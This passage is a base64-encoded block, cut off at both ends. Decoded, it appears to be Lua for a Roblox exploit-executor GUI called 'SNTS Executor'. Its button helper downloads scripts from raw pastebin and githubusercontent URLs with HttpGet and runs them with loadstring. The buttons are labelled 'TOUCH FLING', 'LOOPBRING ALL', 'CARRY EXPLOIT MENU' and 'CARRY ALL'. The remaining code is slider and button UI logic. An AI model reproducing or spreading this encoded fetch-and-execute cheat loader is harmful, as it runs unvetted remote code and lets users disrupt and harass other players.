UNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLjAwMCwgQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKSkKfQoKLS0gQ3JlYXRlIHNjcm9sbGluZyBmcmFtZSBmb3IgYnV0dG9ucwpsb2NhbCBTY3JvbGxpbmdGcmFtZSA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiLCBDYXJyeUJyaW5nRmxpbmdGcmFtZSkKU2Nyb2xsaW5nRnJhbWUuTmFtZSA9ICJDYXJyeUJyaW5nRmxpbmdMaXN0IgpTY3JvbGxpbmdGcmFtZS5BY3RpdmUgPSB0cnVlClNjcm9sbGluZ0ZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxClNjcm9sbGluZ0ZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgNDUxLCAwLCAyMjgpClNjcm9sbGluZ0ZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQpTY3JvbGxpbmdGcmFtZS5BbmNob3JQb2ludCA9IFZlY3RvcjIubmV3KDAuNSwgMC41KQpTY3JvbGxpbmdGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwClNjcm9sbGluZ0ZyYW1lLlNjcm9sbEJhclRoaWNrbmVzcyA9IDUKU2Nyb2xsaW5nRnJhbWUuU2Nyb2xsQmFySW1hZ2VUcmFuc3BhcmVuY3kgPSAxCgpsb2NhbCBMYXlvdXQgPSBJbnN0YW5jZS5uZXcoIlVJTGlzdExheW91dCIsIFNjcm9sbGluZ0ZyYW1lKQpMYXlvdXQuSG9yaXpvbnRhbEFsaWdubWVudCA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXIKTGF5b3V0LlBhZGRpbmcgPSBVRGltLm5ldygwLCA2KQpMYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKCi0tIEhlbHBlciBmdW5jdGlvbiBmb3IgYnV0dG9uIGNyZWF0aW9uCmxvY2FsIGZ1bmN0aW9uIGJ1dHRvbihuYW1lLCB1cmwpCglsb2NhbCBidG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQoJYnRuLlNpemUgPSBVRGltMi5uZXcoMCwgMzYwLCAwLCA0OSkKCWJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNDAsIDQwLCA0MCkKCWJ0bi5Cb3JkZXJTaXplUGl4ZWwgPSAwCglidG4uVGV4dCA9ICIiCglidG4uUGFyZW50ID0gU2Nyb2xsaW5nRnJhbWUKCWJ0bi5aSW5kZXggPSAxCgoJbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGJ0bikKCglsb2NhbCBsYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgYnRuKQoJbGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKCWxhYmVsLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKQoJbGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLCAzMDAsIDAsIDQwKQoJbGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCWxhYmVsLlRleHQgPSBuYW1lCglsYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKCWxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQoJbGFiZWwuVGV4dFNjYWxlZCA9IHRydWUKCWxhYmVsLlpJbmRleCA9IDIKCglidG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCgkJbGFiZWwuVGV4dCA9ICJMb2FkaW5nLi4uIgoJCXRhc2suc3Bhd24oZnVuY3Rpb24oKQoJCQlsb2NhbCBzdWNjZXNzLCByZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCXJldHVybiBnYW1lOkh0dHBHZXQodXJsKQoJCQllbmQpCgkJCWlmIHN1Y2Nlc3MgdGhlbgoJCQkJbG9jYWwgb2ssIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlsb2Fkc3RyaW5nKHJlc3BvbnNlKSgpCgkJCQllbmQpCgkJCQlpZiBvayB0aGVuCgkJCQkJbGFiZWwuVGV4dCA9IG5hbWUgLi4gIiIKCQkJCQl0YXNrLndhaXQoMS41KQoJCQkJCWxhYmVsLlRleHQgPSBuYW1lCgkJCQllbHNlCgkJCQkJbGFiZWwuVGV4dCA9ICLimqDvuI8gRXJyb3IiCgkJCQkJLS0gd2FybigiW1NOVFMgRVJST1JdIENhcnJ5QnJpbmdGbGluZyBleGVjdXRpb24gZmFpbGVkOiIsIG5hbWUsIGVycikKCQkJCWVuZAoJCQllbHNlCgkJCQlsYWJlbC5UZXh0ID0gIkZhaWxlZCIKCQkJCS0tIHdhcm4oIltTTlRTIEVSUk9SXSBDYXJyeUJyaW5nRmxpbmcgbG9hZCBmYWlsZWQ6IiwgbmFtZSkKCQkJZW5kCgkJZW5kKQoJZW5kKQplbmQKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0vLyBbU05UUyBFWEVDVVRPUl0gQ0FSUlksIEJSSU5HICYgRkxJTkcgU0NSSVBUIExJU1QKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKYnV0dG9uKCJUT1VDSCBGTElORyIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvNjlFMGZoODMiKQpidXR0b24oIkxPT1BCUklORyBBTEwiLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FiYWNhZGEwOTE3L0hJTEEvcmVmcy9oZWFkcy9tYWluL0hJTEEiKQpidXR0b24oIkNBUlJZIEVYUExPSVQgTUVOVSIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvZjVnbndQZHAiKQpidXR0b24oIkNBUlJZIEFMTCIsICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvakV1cXp0U24iKQoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TY3JpcHQuQ01ELlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiMThjIl0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyJmOSJdKTsKRzJMWyIxOGMiXVsiQXNwZWN0UmF0aW8iXSA9IDEuNzc2ODU7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2NyaXB0LkNNRC5VSVNjYWxlCkcyTFsiMThkIl0gPSBJbnN0YW5jZS5uZXcoIlVJU2NhbGUiLCBHMkxbImY5Il0pOwoKLS0gQXR0cmlidXRlcwpHMkxbIjE4ZCJdOlNldEF0dHJpYnV0ZShbW1Jlc29sdXRpb25dXSwgVmVjdG9yMi5uZXcoMTkxOSwgMTA4MCkpOwoKLS0gVGFncwpDb2xsZWN0aW9uU2VydmljZTpBZGRUYWcoRzJMWyIxOGQiXSwgW1tVSVNjYWxlUnVudGltZU9iamVjdF1dKTsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLnJlYWRtZQpHMkxbIjE4ZSJdID0gSW5zdGFuY2UubmV3KCJMb2NhbFNjcmlwdCIsIEcyTFsiMSJdKTsKRzJMWyIxOGUiXVsiRW5hYmxlZCJdID0gZmFsc2U7CkcyTFsiMThlIl1bIk5hbWUiXSA9IFtbcmVhZG1lXV07CkcyTFsiMThlIl1bIkRpc2FibGVkIl0gPSB0cnVlOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLk5hdmlnYXRpb25CdXR0b25IYW5kbGVyCkcyTFsiMThmIl0gPSBJbnN0YW5jZS5uZXcoIkxvY2FsU2NyaXB0IiwgRzJMWyIxIl0pOwpHMkxbIjE4ZiJdWyJOYW1lIl0gPSBbW05hdmlnYXRpb25CdXR0b25IYW5kbGVyXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuTmF2aWdhdG9yLkJ1dHRvbkdyb3VwRWZmZWN0CmxvY2FsIGZ1bmN0aW9uIENfMTkoKQpsb2NhbCBzY3JpcHQgPSBHMkxbIjE5Il07CgktLVtbCglCdXR0b25Hcm91cEVmZmVjdDogT09QIHNjcmlwdCB0byBoYW5kbGUgYnV0dG9uIGhpZ2hsaWdodGluZyBhbmQgY2xpY2sgU0ZYIGZvciBIb21lLCBBcHBzLCBTY3JpcHQsIFNldHRpbmdzCglBdHRhY2ggYXMgTG9jYWxTY3JpcHQgdW5kZXIgQ2FudmFzR3JvdXAKCS0tXV0KCQoJbG9jYWwgQ2FudmFzR3JvdXAgPSBzY3JpcHQuUGFyZW50Cglsb2NhbCBidXR0b25OYW1lcyA9IHsiSG9tZSIsICJXaWRnZXQiLCAiU2NyaXB0IiwgIlNldHRpbmdzIn0KCQoJbG9jYWwgQlVUVE9OX1NFTEVDVEVEX1RSQU5TUEFSRU5DWSA9IDAuMgoJbG9jYWwgQlVUVE9OX0RFRkFVTFRfVFJBTlNQQVJFTkNZID0gMAoJbG9jYWwgQlVUVE9OX0hPVkVSX1RSQU5TUEFSRU5DWSA9IDAuMSAtLSBoaWdobGlnaHQgb24gaG92ZXIKCQoJbG9jYWwgQlVUVE9OX1NGWF9JRCA9ICJyYnhhc3NldGlkOi8vNjg5NTA3OTg1MyIgLS0gRXhhbXBsZSBjbGljayBzb3VuZAoJbG9jYWwgQlVUVE9OX0hPVkVSX1NGWF9JRCA9ICJyYnhhc3NldGlkOi8vOTI4NzYxMDg2NTYzMTkiIC0tIEV4YW1wbGUgaG92ZXIgc291bmQgKHJlcGxhY2Ugd2l0aCBhbm90aGVyIGlmIHlvdSBsaWtlKQoJCglsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKCWxvY2FsIEd1aVNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIkd1aVNlcnZpY2UiKQoJCglsb2NhbCBCdXR0b25Hcm91cCA9IHt9CglCdXR0b25Hcm91cC5fX2luZGV4ID0gQnV0dG9uR3JvdXAKCQoJZnVuY3Rpb24gQnV0dG9uR3JvdXAubmV3KGNhbnZhc0dyb3VwLCBidXR0b25OYW1lcykKCQlsb2NhbCBzZWxmID0gc2V0bWV0YXRhYmxlKHt9LCBCdXR0b25Hcm91cCkKCQlzZWxmLmNhbnZhc0dyb3VwID0gY2FudmFzR3JvdXAKCQlzZWxmLmJ1dHRvbnMgPSB7fQoJCXNlbGYuc2Z4ID0gbmlsCgkJc2VsZi5ob3ZlclNmeCA9IG5pbAoJCXNlbGYuc2VsZWN0ZWRCdXR0b24gPSBuaWwKCQlzZWxmLmhvdmVyZWRCdXR0b24gPSBuaWwKCQlzZWxmOl9pbml0QnV0dG9ucyhidXR0b25OYW1lcykKCQlzZWxmOl9pbml0U0ZYKCkKCQlzZWxmOl9jb25uZWN0SW5wdXQoKQoJCXJldHVybiBzZWxmCgllbmQKCQoJZnVuY3Rpb24gQnV0dG9uR3JvdXA6X2luaXRCdXR0b25zKG5hbWVzKQoJCWZvciBpID0gMSwgI25hbWVzIGRvCgkJCWxvY2FsIGJ0bkZyYW1lID0gc2VsZi5jYW52YXNHcm91cDpGaW5kRmlyc3RDaGlsZChuYW1lc1tpXSkKCQkJaWYgYnRuRnJhbWUgYW5kIGJ0bkZyYW1lOklzQSgiRnJhbWUiKSB0aGVuCgkJCQlzZWxmLmJ1dHRvbnNbI3NlbGYuYnV0dG9ucysxXSA9IGJ0bkZyYW1lCgkJCWVuZAoJCWVuZAoJZW5kCgkKCWZ1bmN0aW9uIEJ1dHRvbkdyb3VwOl9pbml0U0ZYKCkKCQlsb2NhbCBzZnggPSBJbnN0YW5jZS5uZXcoIlNvdW5kIikKCQlzZnguTmFtZSA9ICJCdXR0b25DbGlja1NGWCIKCQlzZnguU291bmRJZCA9IEJVVFRPTl9TRlhfSUQKCQlzZnguVm9sdW1lID0gMQoJCXNmeC5QYXJlbnQgPSBzZWxmLmNhbnZhc0dyb3VwCgkJc2VsZi5zZnggPSBzZngKCQoJCWxvY2FsIGhvdmVyU2Z4ID0gSW5zdGFuY2UubmV3KCJTb3VuZCIpCgkJaG92ZXJTZnguTmFtZSA9ICJCdXR0b25Ib3ZlclNGWCIKCQlob3ZlclNmeC5Tb3VuZElkID0gQlVUVE9OX0hPVkVSX1NGWF9JRAoJCWhvdmVyU2Z4LlZvbHVtZSA9IDEKCQlob3ZlclNmeC5QYXJlbnQgPSBzZWxmLmNhbnZhc0dyb3VwCgkJc2VsZi5ob3ZlclNmeCA9IGhvdmVyU2Z4CgllbmQKCQoJZnVuY3Rpb24gQnV0dG9uR3JvdXA6X2Nvbm5lY3RJbnB1dCgpCgkJLS0gSGFuZGxlIGNsaWNrcwoJCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBwcm9jZXNzZWQpCgkJCWlmIHByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCQkJaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KCQkJCWxvY2FsIG1vdXNlUG9zID0gVXNlcklucHV0U2VydmljZTpHZXRNb3VzZUxvY2F0aW9uKCkKCQkJCWxvY2FsIGd1aUluc2V0ID0gR3VpU2VydmljZTpHZXRHdWlJbnNldCgpCgkJCQlsb2NhbCBhZGp1c3RlZFBvcyA9IFZlY3RvcjIubmV3KG1vdXNlUG9zLlgsIG1vdXNlUG9zLlkpIC0gZ3VpSW5zZXQKCQkJCWZvciBpID0gMSwgI3NlbGYuYnV0dG9ucyBkbwoJCQkJCWxvY2FsIGJ0bkZyYW1lID0gc2VsZi5idXR0b25zW2ldCgkJCQkJbG9jYWwgYWJzUG9zID0gYnRuRnJhbWUuQWJzb2x1dGVQb3NpdGlvbgoJCQkJCWxvY2FsIGFic1NpemUgPSBidG5GcmFtZS5BYnNvbHV0ZVNpemUKCQkJCQlpZiBhZGp1c3RlZFBvcy5YID49IGFic1Bvcy5YIGFuZCBhZGp1c3RlZFBvcy5YIDw9IGFic1Bvcy5YICsgYWJzU2l6ZS5YIGFuZAoJCQkJCQlhZGp1c3RlZFBvcy5ZID49IGFic1Bvcy5ZIGFuZCBhZGp1c3RlZFBvcy5ZIDw9IGFic1Bvcy5ZICsgYWJzU2l6ZS5ZIHRoZW4KCQkJCQkJc2VsZjpzZWxlY3RCdXR0b24oYnRuRnJhbWUpCgkJCQkJCWJyZWFrCgkJCQkJZW5kCgkJCQllbmQKCQkJZW5kCgkJZW5kKQoJCgkJLS0gSGFuZGxlIGhvdmVyIGhpZ2hsaWdodAoJCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkJCWlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgdGhlbgoJCQkJbG9jYWwgbW91c2VQb3MgPSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKQoJCQkJbG9jYWwgZ3VpSW5zZXQgPSBHdWlTZXJ2aWNlOkdldEd1aUluc2V0KCkKCQkJCWxvY2FsIGFkanVzdGVkUG9zID0gVmVjdG9yMi5uZXcobW91c2VQb3MuWCwgbW91c2VQb3MuWSkgLSBndWlJbnNldAoJCgkJCQlsb2NhbCBob3ZlcmVkID0gbmlsCgkJCQlmb3IgaSA9IDEsICNzZWxmLmJ1dHRvbnMgZG8KCQkJCQlsb2NhbCBidG5GcmFtZSA9IHNlbGYuYnV0dG9uc1tpXQoJCQkJCWxvY2FsIGFic1BvcyA9IGJ0bkZyYW1lLkFic29sdXRlUG9zaXRpb24KCQkJCQlsb2NhbCBhYnNTaXplID0gYnRuRnJhbWUuQWJzb2x1dGVTaXplCgkJCQkJaWYgYWRqdXN0ZWRQb3MuWCA+PSBhYnNQb3MuWCBhbmQgYWRqdXN0ZWRQb3MuWCA8PSBhYnNQb3MuWCArIGFic1NpemUuWCBhbmQKCQkJCQkJYWRqdXN0ZWRQb3MuWSA+PSBhYnNQb3MuWSBhbmQgYWRqdXN0ZWRQb3MuWSA8PSBhYnNQb3MuWSArIGFic1NpemUuWSB0aGVuCgkJCQkJCWhvdmVyZWQgPSBidG5GcmFtZQoJCQkJCQlicmVhawoJCQkJCWVuZAoJCQkJZW5kCgkJCQlzZWxmOnVwZGF0ZUhvdmVyKGhvdmVyZWQpCgkJCWVuZAoJCWVuZCkKCWVuZAoJCglmdW5jdGlvbiBCdXR0b25Hcm91cDp1cGRhdGVIb3ZlcihidG5GcmFtZSkKCQlpZiBzZWxmLmhvdmVyZWRCdXR0b24gPT0gYnRuRnJhbWUgdGhlbiByZXR1cm4gZW5kCgkKCQktLSBSZXNldCBvbGQgaG92ZXIgdHJhbnNwYXJlbmN5CgkJaWYgc2VsZi5ob3ZlcmVkQnV0dG9uIGFuZCBzZWxmLmhvdmVyZWRCdXR0b24gfj0gc2VsZi5zZWxlY3RlZEJ1dHRvbiB0aGVuCgkJCXNlbGYuaG92ZXJlZEJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQlVUVE9OX0RFRkFVTFRfVFJBTlNQQVJFTkNZCgkJZW5kCgkKCQlzZWxmLmhvdmVyZWRCdXR0b24gPSBidG5GcmFtZQoJCgkJLS0gQXBwbHkgaG92ZXIgZWZmZWN0CgkJaWYgYnRuRnJhbWUgYW5kIGJ0bkZyYW1lIH49IHNlbGYuc2VsZWN0ZWRCdXR0b24gdGhlbgoJCQlidG5GcmFtZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQlVUVE9OX0hPVkVSX1RSQU5TUEFSRU5DWQoJCQlpZiBzZWxmLmhvdmVyU2Z4IHRoZW4KCQkJCXNlbGYuaG92ZXJTZng6UGxheSgpCgkJCWVuZAoJCWVuZAoJZW5kCgkKCWZ1bmN0aW9uIEJ1dHRvbkdyb3VwOnNlbGVjdEJ1dHRvbihidG5GcmFtZSkKCQlpZiBzZWxmLnNlbGVjdGVkQnV0dG9uID09IGJ0bkZyYW1lIHRoZW4gcmV0dXJuIGVuZAoJCXNlbGYuc2VsZWN0ZWRCdXR0b24gPSBidG5GcmFtZQoJCgkJLS0gUmVzZXQgYWxsIGJ1dHRvbnMKCQlmb3IgaSA9IDEsICNzZWxmLmJ1dHRvbnMgZG8KCQkJbG9jYWwgYnRuID0gc2VsZi5idXR0b25zW2ldCgkJCWJ0bi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQlVUVE9OX0RFRkFVTFRfVFJBTlNQQVJFTkNZCgkJZW5kCgkKCQktLSBLZWVwIGhvdmVyIHN0YXRlIGlmIHNhbWUgYXMgc2VsZWN0ZWQKCQlpZiBzZWxmLmhvdmVyZWRCdXR0b24gYW5kIHNlbGYuaG92ZXJlZEJ1dHRvbiB+PSBidG5GcmFtZSB0aGVuCgkJCXNlbGYuaG92ZXJlZEJ1dHRvbi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gQlVUVE9OX0hPVkVSX1RSQU5TUEFSRU5DWQoJCWVuZAoJCgkJLS0gU2V0IHNlbGVjdGVkIGJ1dHRvbgoJCWJ0bkZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSBCVVRUT05fU0VMRUNURURfVFJBTlNQQVJFTkNZCgkKCQlpZiBzZWxmLnNmeCB0aGVuCgkJCXNlbGYuc2Z4OlBsYXkoKQoJCWVuZAoJZW5kCgkKCS0tIEluaXRpYWxpemUKCWxvY2FsIGdyb3VwID0gQnV0dG9uR3JvdXAubmV3KENhbnZhc0dyb3VwLCBidXR0b25OYW1lcykKCWlmIGdyb3VwLmJ1dHRvbnNbMV0gdGhlbgoJCWdyb3VwOnNlbGVjdEJ1dHRvbihncm91cC5idXR0b25zWzFdKQoJZW5kCgkKZW5kOwp0YXNrLnNwYXduKENfMTkpOwotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuRGV0YWlscy5GbGlnaHQuU2xpZGVyQ29udGFpbmVyLlNsaWRlci5TbGlkZXJWYWx1ZUhhbmRsZXIKbG9jYWwgZnVuY3Rpb24gQ18yYSgpCmxvY2FsIHNjcmlwdCA9IEcyTFsiMmEiXTsKCWxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoJbG9jYWwgc2xpZGVyID0gc2NyaXB0LlBhcmVudAoJbG9jYWwgc2xpZGVyQ29udGFpbmVyID0gc2xpZGVyLlBhcmVudAoJCglsb2NhbCBkcmFnZ2luZyA9IGZhbHNlCgkKCS0tIE9wdGlvbmFsbHksIGNyZWF0ZSBhIHZhbHVlIGxhYmVsIChpZiB5b3Ugd2FudCB0byBzaG93IHRoZSB2YWx1ZSkKCWxvY2FsIHZhbHVlTGFiZWwgPSBzbGlkZXI6RmluZEZpcnN0Q2hpbGQoIlZhbHVlTGFiZWwiKSAtLSBJZiB5b3UgaGF2ZSBhIFRleHRMYWJlbCBuYW1lZCAiVmFsdWVMYWJlbCIgaW5zaWRlIHNsaWRlcgoJCgktLSBIZWxwZXIgdG8gZ2V0IHNsaWRlciB2YWx1ZSBvdXQgb2YgMTAwIGJhc2VkIG9uIHdpZHRoCglsb2NhbCBmdW5jdGlvbiBnZXRTbGlkZXJWYWx1ZSgpCgkgICAgbG9jYWwgY29udGFpbmVyQWJzU2l6ZSA9IHNsaWRlckNvbnRhaW5lci5BYnNvbHV0ZVNpemUKCSAgICBsb2NhbCBzbGlkZXJBYnNTaXplID0gc2xpZGVyLkFic29sdXRlU2l6ZQoJCgkgICAgbG9jYWwgcGVyY2VudCA9IHNsaWRlckFic1NpemUuWCAvIGNvbnRhaW5lckFic1NpemUuWAoJICAgIHBlcmNlbnQgPSBtYXRoLmNsYW1wKHBlcmNlbnQsIDAsIDEpCgkgICAgbG9jYWwgdmFsdWUgPSBtYXRoLmZsb29yKHBlcmNlbnQgKiAxMDAgKyAwLjUpCgkKCSAgICByZXR1cm4gdmFsdWUKCWVuZAoJCgktLSBGdW5jdGlvbiB0byBzZXQgc2xpZGVyIHdpZHRoIGJhc2VkIG9uIG1vdXNlL3RvdWNoIHBvc2l0aW9uCglsb2NhbCBmdW5jdGlvbiBzZXRTbGlkZXJXaWR0aFRvSW5wdXQoaW5wdXQpCgkgICAgbG9jYWwgY29udGFpbmVyQWJzUG9zID0gc2xpZGVyQ29udGFpbmVyLkFic29sdXRlUG9zaXRpb24KCSAgICBsb2NhbCBjb250YWluZXJBYnNTaXplID0gc2xpZGVyQ29udGFpbmVyLkFic29sdXRlU2l6ZQoJICAgIGxvY2FsIG1vdXNlWCA9IGlucHV0LlBvc2l0aW9uLlgKCQoJICAgIC0tIENsYW1wIG1vdXNlWCB0byBjb250YWluZXIgYm91bmRzCgkgICAgbG9jYWwgcmVsYXRpdmVYID0gbWF0aC5jbGFtcChtb3VzZVggLSBjb250YWluZXJBYnNQb3MuWCwgMCwgY29udGFpbmVyQWJzU2l6ZS5YKQoJICAgIC0tIFNldCBzbGlkZXIgd2lkdGggdG8gbW91c2VYIHBvc2l0aW9uIChtaW5pbXVtIHdpZHRoIDEwKQoJICAgIGxvY2FsIG5ld1dpZHRoID0gbWF0aC5jbGFtcChyZWxhdGl2ZVgsIDEwLCBjb250YWluZXJBYnNTaXplLlgpCgkgICAgc2xpZGVyLlNpemUgPSBVRGltMi5uZXcoMCwgbmV3V2lkdGgsIHNsaWRlci5TaXplLlkuU2NhbGUsIHNsaWRlci5TaXplLlkuT2Zmc2V0KQoJCgkgICAgbG9jYWwgdmFsdWUgPSBnZXRTbGlkZXJWYWx1ZSgpCgkgICAgLS0gcHJpbnQoIlNsaWRlciB2YWx1ZToiLCB2YWx1ZSkKCSAgICBpZiB2YWx1ZUxhYmVsIGFuZCB2YWx1ZUxhYmVsOklzQSgiVGV4dExhYmVsIikgdGhlbgoJICAgICAgICB2YWx1ZUxhYmVsLlRleHQgPSB0b3N0cmluZyh2YWx1ZSkKCSAgICBlbmQKCWVuZAoJCgktLSBMaXN0ZW4gZm9yIGNsaWNrL3RvdWNoIG9uIHRoZSBjb250YWluZXIgdG8gc25hcCBzbGlkZXIKCXNsaWRlckNvbnRhaW5lci5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KCSAgICAgICAgc2V0U2xpZGVyV2lkdGhUb0lucHV0KGlucHV0KQoJICAgICAgICBkcmFnZ2luZyA9IHRydWUKCSAgICBlbmQKCWVuZCkKCQoJLS0gQWxzbyBhbGxvdyBkcmFnZ2luZyBieSBob2xkaW5nIG1vdXNlL3RvdWNoCglVc2VySW5wdXRTZXJ2aWNlLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCSAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgoJICAgICAgICBkcmFnZ2luZyA9IGZhbHNlCgkgICAgZW5kCgllbmQpCgkKCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRDaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCgkgICAgaWYgZHJhZ2dpbmcgYW5kIChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50IG9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoKSB0aGVuCgkgICAgICAgIHNldFNsaWRlcldpZHRoVG9JbnB1dChpbnB1dCkKCSAgICBlbmQKCWVuZCkKCQoJCmVuZDsKdGFzay5zcGF3bihDXzJhKTsKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLkRldGFpbHMuSnVtcC5KdW1wU2xpZGVyQ29udGFpbmVyLkp1bXBTbGlkZXJGcmFtZS5KdW1wU2xpZGVyVmFsdWVIYW5kbGVyCmxvY2FsIGZ1bmN0aW9uIENfMzQoKQpsb2NhbCBzY3JpcHQgPSBHMkxbIjM0Il07Cglsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKCWxvY2FsIHNsaWRlciA9IHNjcmlwdC5QYXJlbnQKCWxvY2FsIHNsaWRlckNvbnRhaW5lciA9IHNsaWRlci5QYXJlbnQKCQoJbG9jYWwgZHJhZ2dpbmcgPSBmYWxzZQoJCgktLSBPcHRpb25hbGx5LCBjcmVhdGUgYSB2YWx1ZSBsYWJlbCAoaWYgeW91IHdhbnQgdG8gc2hvdyB0aGUgdmFsdWUpCglsb2NhbCB2YWx1ZUxhYmVsID0gc2xpZGVyOkZpbmRGaXJzdENoaWxkKCJWYWx1ZUxhYmVsIikgLS0gSWYgeW91IGhhdmUgYSBUZXh0TGFiZWwgbmFtZWQgIlZhbHVlTGFiZWwiIGluc2lkZSBzbGlkZXIKCQoJLS0gSGVscGVyIHRvIGdldCBzbGlkZXIgdmFsdWUgb3V0IG9mIDEwMCBiYXNlZCBvbiB3aWR0aAoJbG9jYWwgZnVuY3Rpb24gZ2V0U2xpZGVyVmFsdWUoKQoJICAgIGxvY2FsIGNvbnRhaW5lckFic1NpemUgPSBzbGlkZXJDb250YWluZXIuQWJzb2x1dGVTaXplCgkgICAgbG9jYWwgc2xpZGVyQWJzU2l6ZSA9IHNsaWRlci5BYnNvbHV0ZVNpemUKCQoJICAgIGxvY2FsIHBlcmNlbnQgPSBzbGlkZXJBYnNTaXplLlggLyBjb250YWluZXJBYnNTaXplLlgKCSAgICBwZXJjZW50ID0gbWF0aC5jbGFtcChwZXJjZW50LCAwLCAxKQoJICAgIGxvY2FsIHZhbHVlID0gbWF0aC5mbG9vcihwZXJjZW50ICogMTAwICsgMC41KQoJCgkgICAgcmV0dXJuIHZhbHVlCgllbmQKCQoJLS0gRnVuY3Rpb24gdG8gc2V0IHNsaWRlciB3aWR0aCBiYXNlZCBvbiBtb3VzZS90b3VjaCBwb3NpdGlvbgoJbG9jYWwgZnVuY3Rpb24gc2V0U2xpZGVyV2lkdGhUb0lucHV0KGlucHV0KQoJICAgIGxvY2FsIGNvbnR